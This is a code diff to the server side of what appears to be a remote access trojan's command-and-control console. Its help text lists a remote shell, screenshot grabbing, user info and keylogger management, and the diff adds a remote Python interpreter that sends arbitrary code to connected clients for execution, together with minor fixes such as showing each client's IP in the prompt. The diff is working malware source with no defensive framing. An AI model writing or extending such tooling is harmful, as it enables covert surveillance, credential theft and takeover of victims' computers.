@@ -22,6 +22,7 @@ queue = Queue()
 interface_help = """
 --h | See this Help Message
 --e | Open a shell
+--i | Open Remote Python Interpreter
 --g | Grabs a screenshot
 --u | User Info
 --k (start) (stop) (dump) | Manage Keylogger
@@ -244,7 +245,7 @@ class MultiServer(object):
         results = ''
         for i, conn in enumerate(self.all_connections):
             try:
-                self.send(conn, json_dumps.dumps(['--l']))
+                self.send(conn, json_dumps(['--l']))
                 conn.recv(20480)
             except:
                 del self.all_connections[i]
@@ -311,6 +312,24 @@ class MultiServer(object):
         print('Screenshot saved.')
         return
 
+    def python_interpreter(self, conn):
+        """ Remote Python Interpreter """
+        self.send(conn, json_dumps(['--i']))
+        self.receive(conn, _print=False)
+        print('CAUTION! Using this feature wrong can break the client until restarted.')
+        while 1:
+            command = input('>> ')
+            if command == 'exit' or command == 'exit()':
+                self.send(conn, b'<QUIT>')
+                self.receive(conn)
+                break
+            self.send(conn, command.encode())
+            data = json.loads(self.receive(conn, _print=False).decode())
+            if data[0] != '':
+                print(data[0])
+            if data[1] != None:
+                print(data[1])
+
     def shell(self, conn):
         """ Remote Shell with Client """
         self.send(conn, json_dumps(['<GETCWD>']))
@@ -369,12 +388,16 @@ class MultiServer(object):
 
     def interface(self, conn, target):
         """ CLI Interface to Client """
+        ip = self.all_addresses[self.all_connections.index(conn)][0]
         while True:
-            command = input('>> ')
+            command = input('{0}> '.format(ip))
             if '--b' in command:
                 break
             if '--e' in command:
                 self.shell(conn)
+                continue
+            if '--i' in command:
+                self.python_interpreter(conn)
                 continue
             if '--c' in command:
                 text_to_copy = input('Text to copy: ')
@@ -471,7 +494,7 @@ class MultiServer(object):
                 command = input('> ')
                 if command == '--h':
                     print(turtle_help)
-                if command[:3] == '--a':
+                elif command[:3] == '--a':
                     if len(command) > 4:
                         for client in self.all_connections:
                             try:
